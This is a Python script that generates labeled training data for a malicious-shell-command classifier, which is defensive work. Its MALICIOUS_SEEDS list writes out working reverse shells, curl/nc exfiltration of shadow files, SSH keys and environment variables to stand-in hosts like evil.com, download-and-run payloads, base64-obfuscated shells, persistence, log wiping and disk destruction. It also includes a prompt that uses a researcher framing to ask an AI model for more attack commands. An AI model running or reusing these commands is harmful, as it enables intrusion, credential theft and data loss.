"""
AI-Powered Dataset Generator for Kernel AI Security
Uses Claude API to generate thousands of diverse labeled commands
for training the RCE detection ML model.
"""

import json
import time
import random
import re
import os

# ─────────────────────────────────────────────────────────────────────────────
# STATIC SEED DATA  (used even if API is unavailable)
# ─────────────────────────────────────────────────────────────────────────────

SAFE_SEEDS = [
    # File operations
    "ls -la", "ls -la /home", "ls /var/log", "pwd", "cd /tmp",
    "mkdir backup", "mkdir -p /opt/app/logs", "touch file.txt",
    "cp file.txt backup/", "cp -r src/ dst/", "mv old.txt new.txt",
    "rm file.txt", "rm -rf ./build", "chmod 644 file.txt",
    "chmod +x script.sh", "chown user:group file.txt",
    "find . -name '*.py'", "find /var/log -mtime -7",
    "du -sh /home/user", "df -h", "stat file.txt",
    # Text / editors
    "cat README.md", "cat /etc/hosts", "less /var/log/syslog",
    "head -20 access.log", "tail -50 error.log", "tail -f /var/log/syslog",
    "grep -r 'TODO' src/", "grep -n 'error' app.log",
    "sed 's/foo/bar/g' file.txt", "awk '{print $1}' data.csv",
    "sort data.txt | uniq -c", "wc -l data.txt",
    "diff old.txt new.txt", "patch -p1 < fix.patch",
    # System info
    "ps aux", "ps -ef | grep nginx", "top -bn1", "htop",
    "free -m", "uptime", "uname -r", "uname -a",
    "lscpu", "lsblk", "lsof -i :8080",
    "netstat -tulpn", "ss -tlnp", "ifconfig", "ip addr show",
    "ping -c 4 google.com", "traceroute 8.8.8.8",
    "nslookup example.com", "dig example.com",
    "who", "w", "last", "id", "whoami", "groups",
    # Package management
    "apt update", "apt upgrade -y", "apt install git -y",
    "apt list --installed", "dpkg -l | grep python",
    "pip install requests", "pip install -r requirements.txt",
    "pip list", "pip show numpy", "pip freeze > requirements.txt",
    "npm install", "npm install express", "npm run build",
    "npm test", "npm start", "yarn install", "yarn build",
    # Git
    "git status", "git log --oneline -10", "git diff HEAD~1",
    "git add .", "git commit -m 'fix bug'", "git push origin main",
    "git pull", "git clone https://github.com/user/repo.git",
    "git branch -a", "git checkout -b feature/new",
    "git merge main", "git stash", "git tag v1.0.0",
    # Python / dev
    "python3 script.py", "python3 -m pytest tests/",
    "python3 -m venv venv", "python3 manage.py runserver",
    "python3 -c 'print(\"hello\")'", "python3 setup.py install",
    "flask run", "uvicorn app:app --reload",
    "node server.js", "node -e 'console.log(1+1)'",
    # Docker / services
    "docker ps", "docker ps -a", "docker images",
    "docker build -t myapp .", "docker run -d -p 80:80 nginx",
    "docker stop container_id", "docker rm container_id",
    "docker logs myapp", "docker exec -it myapp bash",
    "docker-compose up -d", "docker-compose down",
    "systemctl status nginx", "systemctl start nginx",
    "systemctl restart apache2", "systemctl enable ssh",
    "service mysql start", "service postgresql restart",
    # Networking / web
    "curl https://api.example.com/health",
    "curl -X GET http://localhost:8000/status",
    "curl -H 'Authorization: Bearer token' https://api.example.com",
    "wget https://example.com/file.zip",
    "wget -O output.txt https://example.com/data",
    # Archive
    "tar -czf backup.tar.gz ./data", "tar -xzf archive.tar.gz",
    "zip -r project.zip ./src", "unzip file.zip -d /tmp/extracted",
    # Misc safe
    "echo 'Hello World'", "echo $HOME", "echo $PATH",
    "date", "date +%Y-%m-%d", "cal",
    "env | grep PATH", "printenv HOME",
    "history | tail -20", "alias ll='ls -la'",
    "export MY_VAR=hello", "source ~/.bashrc",
    "cron -l", "crontab -l",
    "ssh user@192.168.1.10", "ssh -i ~/.ssh/id_rsa user@server",
    "scp file.txt user@server:/tmp/", "rsync -av ./src/ user@server:/app/",
    "make", "make install", "make clean", "make test",
    "gcc -o app main.c", "g++ -o app main.cpp",
    "java -jar app.jar", "javac Main.java",
    "mysql -u root -p mydb", "psql -U postgres -d mydb",
    "redis-cli ping", "mongo --eval 'db.stats()'",
    "openssl genrsa -out key.pem 2048",
    "openssl req -new -x509 -key key.pem -out cert.pem",
    "htpasswd -c .htpasswd admin",
]

MALICIOUS_SEEDS = [
    # Reverse shells
    "bash -i >& /dev/tcp/192.168.1.1/4444 0>&1",
    "bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'",
    "nc -e /bin/bash 192.168.1.100 4444",
    "nc -e /bin/sh attacker.com 1337",
    "ncat --exec /bin/bash attacker.com 4444",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
    "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f",
    # Data exfiltration
    "cat /etc/shadow", "cat /etc/passwd | nc attacker.com 9999",
    "cat /etc/shadow | curl -d @- http://evil.com/collect",
    "cat ~/.ssh/id_rsa | curl -X POST http://attacker.com/key -d @-",
    "cat ~/.ssh/id_rsa", "cat /root/.ssh/authorized_keys",
    "find / -name '*.pem' 2>/dev/null | xargs cat",
    "find / -name 'id_rsa' 2>/dev/null",
    "find / -name '*.key' 2>/dev/null | xargs cat | nc attacker.com 8888",
    "grep -r 'password' /etc/ 2>/dev/null",
    "grep -r 'SECRET_KEY' /app/ | curl -d @- http://evil.com",
    "env | curl -d @- http://attacker.com/env",
    "printenv | nc evil.com 9999",
    # Privilege escalation
    "sudo su -", "sudo /bin/bash", "sudo chmod 4755 /bin/bash",
    "sudo passwd root", "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "chmod u+s /bin/bash", "chmod 4777 /bin/bash",
    "chown root /tmp/shell && chmod 4755 /tmp/shell",
    "cp /bin/bash /tmp/shell; chmod +s /tmp/shell",
    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\"'",
    # Destructive commands
    "rm -rf /", "rm -rf /*", "rm -rf /home", "rm -rf /etc",
    "dd if=/dev/zero of=/dev/sda", "dd if=/dev/urandom of=/dev/sda",
    "mkfs.ext4 /dev/sda1", "shred -vfz /dev/sda",
    "> /etc/passwd", "> /etc/shadow", "echo '' > /etc/passwd",
    "fork() { fork | fork & }; fork",
    ":(){ :|:& };:", # fork bomb
    "while true; do echo bomb; done",
    # Command injection
    "ping -c 1 google.com; cat /etc/passwd",
    "ls -la && curl http://evil.com/shell.sh | bash",
    "echo test; nc -e /bin/bash attacker.com 4444",
    "id; uname -a; cat /etc/passwd",
    "curl http://evil.com/c2.sh | bash",
    "wget -O- http://attacker.com/payload.sh | sh",
    "curl http://evil.com/shell.sh -o /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
    # Encoded payloads
    "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash",
    "echo L2Jpbi9iYXNoIC1p | base64 -d | sh",
    "python3 -c 'exec(__import__(\"base64\").b64decode(\"aW1wb3J0IG9z\"))'",
    "eval $(echo 'cat /etc/shadow' | base64 -d)",
    "bash <(base64 -d <<< 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA0NDQ0')",
    # Web shells / downloads
    "curl http://evil.com/rootkit.tar.gz | tar xz && ./install.sh",
    "wget http://attacker.com/malware -O /tmp/x && chmod +x /tmp/x && /tmp/x",
    "curl -fsSL http://get.backdoor.io | sudo bash",
    "python3 -c 'import urllib.request; exec(urllib.request.urlopen(\"http://evil.com/payload.py\").read())'",
    # Cron persistence
    "crontab -e && echo '* * * * * bash -i >& /dev/tcp/evil.com/4444 0>&1'",
    "echo '* * * * * /tmp/backdoor.sh' | crontab -",
    "(crontab -l ; echo '* * * * * curl http://evil.com/c2.sh | bash') | crontab -",
    # Log wiping
    "echo '' > /var/log/auth.log", "> /var/log/syslog",
    "rm -rf /var/log/*", "shred -vzu /var/log/auth.log",
    "find /var/log -type f -exec truncate -s 0 {} \\;",
    # SUID abuse
    "find / -perm -4000 2>/dev/null", "find / -perm -u=s -type f 2>/dev/null",
    "find / -writable -type d 2>/dev/null | head -20",
    "nmap --script=exploit 192.168.1.0/24",
    # Container escape
    "docker run --privileged -v /:/mnt alpine chroot /mnt sh",
    "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
    "docker run -v /etc:/host_etc alpine cat /host_etc/shadow",
    # Kernel exploits
    "gcc exploit.c -o exploit && ./exploit",
    "python3 exploit.py --target localhost --lport 4444",
    "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp'",
]


# ─────────────────────────────────────────────────────────────────────────────
# AI GENERATION VIA CLAUDE API
# ─────────────────────────────────────────────────────────────────────────────

def call_claude(prompt: str, max_tokens: int = 1000) -> str:
    """Call Claude API and return text response."""
    try:
        import urllib.request
        payload = json.dumps({
            "model": "claude-sonnet-4-20250514",
            "max_tokens": max_tokens,
            "messages": [{"role": "user", "content": prompt}]
        }).encode()
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
            return data["content"][0]["text"]
    except Exception as e:
        print(f"  [API] Call failed: {e}")
        return ""


def parse_commands_from_response(text: str) -> list:
    """Extract commands from Claude response (handles JSON arrays and line-by-line)."""
    commands = []
    # Try JSON array first
    try:
        match = re.search(r'\[.*?\]', text, re.DOTALL)
        if match:
            items = json.loads(match.group())
            commands = [str(c).strip() for c in items if str(c).strip()]
            if commands:
                return commands
    except Exception:
        pass
    # Fall back to line-by-line, stripping bullets/numbers/quotes
    for line in text.splitlines():
        line = re.sub(r'^[\d\.\-\*\>\#\`"\' ]+', '', line).strip().rstrip('",`\'')
        if line and len(line) > 3 and not line.lower().startswith(('here', 'note', 'these', 'the ', 'this', '#')):
            commands.append(line)
    return commands


def generate_safe_commands_ai(batch: int, batch_num: int) -> list:
    """Use Claude to generate diverse safe Linux commands."""
    categories = [
        "system administration and monitoring",
        "file and directory management",
        "network diagnostics and connectivity checks",
        "package management (apt, pip, npm, yarn)",
        "git version control operations",
        "docker container management",
        "Python and Node.js development",
        "database administration (mysql, psql, mongo)",
        "log analysis with grep, awk, sed",
        "backup and archive operations (tar, zip, rsync)",
        "user and permission management",
        "process management (ps, kill, nice)",
        "cron job and scheduling operations",
        "SSL certificate and key generation",
        "web API calls with curl (safe endpoints)",
    ]
    cat = categories[batch_num % len(categories)]
    prompt = f"""Generate exactly {batch} realistic, diverse Linux/Unix shell commands for the category: "{cat}".

Rules:
- ALL commands must be completely safe, legitimate, and non-malicious
- Use realistic arguments, paths, filenames, IPs (192.168.x.x range only for safe ops)
- Vary complexity: mix simple and multi-flag commands
- No reverse shells, no malware downloads, no destructive operations
- Return ONLY a JSON array of strings, nothing else, no markdown

Example format: ["ls -la /home", "grep -r 'error' /var/log/nginx/"]"""

    text = call_claude(prompt, max_tokens=1500)
    return parse_commands_from_response(text)


def generate_malicious_commands_ai(batch: int, batch_num: int) -> list:
    """Use Claude to generate diverse malicious commands for classifier training."""
    attack_types = [
        "reverse shell payloads using bash, nc, python, perl, ruby, socat",
        "data exfiltration of /etc/passwd, /etc/shadow, SSH keys, env vars",
        "privilege escalation via sudo abuse, SUID bits, PATH hijacking",
        "destructive commands: disk wiping, log deletion, file corruption",
        "command injection with semicolons, pipes, &&, backticks",
        "encoded payloads using base64, hex encoding, eval chains",
        "malware download and execution via curl/wget piped to bash",
        "persistence mechanisms: crontab backdoors, rc.local, systemd units",
        "container escape and Docker privilege abuse",
        "credential harvesting: SSH keys, config files, browser data",
        "network reconnaissance: nmap scans, ARP poisoning, sniffing",
        "web shell upload and remote code execution via HTTP",
        "kernel exploit compilation and execution",
        "lateral movement: SSH pivoting, credential stuffing",
        "anti-forensics: log wiping, history deletion, timestamp tampering",
    ]
    atype = attack_types[batch_num % len(attack_types)]
    prompt = f"""You are a cybersecurity researcher generating training data for a malicious command classifier.
Generate exactly {batch} example attack commands of type: "{atype}".

Rules:
- Commands should look realistic (as seen in real penetration tests or CTF writeups)
- Vary IPs, ports, filenames to increase diversity
- Include both simple and obfuscated variants
- These are for ML TRAINING DATA ONLY - educational/research purpose
- Return ONLY a JSON array of strings, no explanations, no markdown

Example format: ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh evil.com 9001"]"""

    text = call_claude(prompt, max_tokens=1500)
    return parse_commands_from_response(text)


# ─────────────────────────────────────────────────────────────────────────────
# AUGMENTATION
# ─────────────────────────────────────────────────────────────────────────────

def augment_safe(cmd: str) -> list:
    """Generate variants of safe commands."""
    variants = [cmd]
    # Vary IPs in ssh/scp/rsync
    for ip in ["192.168.0.10", "192.168.1.50", "10.0.1.5", "172.16.0.2"]:
        if "192.168.1.10" in cmd:
            variants.append(cmd.replace("192.168.1.10", ip))
    # Vary paths
    for path in ["/tmp", "/opt", "/srv", "/var/data"]:
        if "/tmp" in cmd and path != "/tmp":
            variants.append(cmd.replace("/tmp", path))
    # Add -v flag variants
    if cmd.startswith(("cp ", "mv ", "mkdir ", "rsync ")):
        if " -v" not in cmd:
            variants.append(cmd + " -v")
    return list(set(variants))


def augment_malicious(cmd: str) -> list:
    """Generate variants of malicious commands with different IPs/ports."""
    variants = [cmd]
    attacker_ips = ["10.0.0.1", "192.168.100.1", "172.16.0.99", "evil.com", "attacker.local"]
    ports = ["4444", "1337", "9001", "8080", "443", "53", "31337"]
    for ip in attacker_ips:
        for port in random.sample(ports, 2):
            new = re.sub(r'\d+\.\d+\.\d+\.\d+', ip, cmd)
            new = re.sub(r'\b(4444|1337|9001|8888|9999|31337)\b', port, new)
            new = re.sub(r'(attacker\.com|evil\.com|c2\.example\.com)', ip, new)
            if new != cmd:
                variants.append(new)
                break
    return list(set(variants))[:4]  # cap variants per command


# ─────────────────────────────────────────────────────────────────────────────
# MAIN GENERATION PIPELINE
# ─────────────────────────────────────────────────────────────────────────────

def generate_full_dataset(
    target_safe: int = 2000,
    target_malicious: int = 2000,
    use_ai: bool = True,
    batches_per_class: int = 15,
    commands_per_batch: int = 40,
) -> dict:
    """
    Generate a full labeled dataset.
    Returns {"safe": [...], "malicious": [...]}
    """
    print(f"\n{'='*60}")
    print("  AI-Powered Dataset Generator for Kernel AI Security")
    print(f"{'='*60}")
    print(f"  Target: {target_safe} safe + {target_malicious} malicious commands")
    print(f"  AI generation: {'ENABLED' if use_ai else 'DISABLED (static only)'}")
    print(f"{'='*60}\n")

    safe_set = set(SAFE_SEEDS)
    malicious_set = set(MALICIOUS_SEEDS)

    # ── Augment seeds ──────────────────────────────────────────────────────
    print("[1/4] Augmenting seed data...")
    aug_safe = set()
    for cmd in SAFE_SEEDS:
        aug_safe.update(augment_safe(cmd))
    safe_set.update(aug_safe)

    aug_mal = set()
    for cmd in MALICIOUS_SEEDS:
        aug_mal.update(augment_malicious(cmd))
    malicious_set.update(aug_mal)
    print(f"      Safe after augmentation:      {len(safe_set)}")
    print(f"      Malicious after augmentation: {len(malicious_set)}")

    # ── AI generation ──────────────────────────────────────────────────────
    if use_ai:
        print(f"\n[2/4] Generating SAFE commands via Claude API ({batches_per_class} batches)...")
        for i in range(batches_per_class):
            if len(safe_set) >= target_safe:
                break
            print(f"      Batch {i+1}/{batches_per_class} (have {len(safe_set)})...", end=" ", flush=True)
            cmds = generate_safe_commands_ai(commands_per_batch, i)
            for c in cmds:
                safe_set.add(c)
                safe_set.update(augment_safe(c))
            print(f"+{len(cmds)} → {len(safe_set)} total")
            time.sleep(0.3)

        print(f"\n[3/4] Generating MALICIOUS commands via Claude API ({batches_per_class} batches)...")
        for i in range(batches_per_class):
            if len(malicious_set) >= target_malicious:
                break
            print(f"      Batch {i+1}/{batches_per_class} (have {len(malicious_set)})...", end=" ", flush=True)
            cmds = generate_malicious_commands_ai(commands_per_batch, i)
            for c in cmds:
                malicious_set.add(c)
                malicious_set.update(augment_malicious(c))
            print(f"+{len(cmds)} → {len(malicious_set)} total")
            time.sleep(0.3)
    else:
        print("\n[2/4] Skipping AI generation (use_ai=False)")
        print("[3/4] Skipping AI generation (use_ai=False)")

    # ── Final assembly ─────────────────────────────────────────────────────
    print(f"\n[4/4] Assembling final dataset...")
    safe_list = list(safe_set)
    malicious_list = list(malicious_set)
    random.shuffle(safe_list)
    random.shuffle(malicious_list)

    # Trim to targets
    safe_list = safe_list[:target_safe]
    malicious_list = malicious_list[:target_malicious]

    print(f"      Final safe commands:      {len(safe_list)}")
    print(f"      Final malicious commands: {len(malicious_list)}")

    return {"safe": safe_list, "malicious": malicious_list}


def save_dataset(dataset: dict, data_dir: str = "./data"):
    """Save dataset as txt files and combined JSON with labels."""
    os.makedirs(data_dir, exist_ok=True)

    safe_path = os.path.join(data_dir, "commands_safe.txt")
    mal_path  = os.path.join(data_dir, "commands_malicious.txt")
    json_path = os.path.join(data_dir, "dataset_labeled.json")

    with open(safe_path, "w") as f:
        f.write("\n".join(dataset["safe"]))

    with open(mal_path, "w") as f:
        f.write("\n".join(dataset["malicious"]))

    labeled = (
        [{"command": c, "label": 0, "class": "safe"} for c in dataset["safe"]] +
        [{"command": c, "label": 1, "class": "malicious"} for c in dataset["malicious"]]
    )
    random.shuffle(labeled)
    with open(json_path, "w") as f:
        json.dump(labeled, f, indent=2)

    print(f"\n  Saved:")
    print(f"    {safe_path}  ({len(dataset['safe'])} lines)")
    print(f"    {mal_path}  ({len(dataset['malicious'])} lines)")
    print(f"    {json_path}  ({len(labeled)} labeled entries)")
    return safe_path, mal_path, json_path


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate ML training dataset")
    parser.add_argument("--no-ai", action="store_true", help="Skip AI generation (static only)")
    parser.add_argument("--target-safe", type=int, default=2000)
    parser.add_argument("--target-malicious", type=int, default=2000)
    parser.add_argument("--batches", type=int, default=15)
    parser.add_argument("--batch-size", type=int, default=40)
    parser.add_argument("--data-dir", type=str, default="./data")
    args = parser.parse_args()

    dataset = generate_full_dataset(
        target_safe=args.target_safe,
        target_malicious=args.target_malicious,
        use_ai=not args.no_ai,
        batches_per_class=args.batches,
        commands_per_batch=args.batch_size,
    )
    save_dataset(dataset, args.data_dir)
    print("\n✅ Dataset generation complete!")
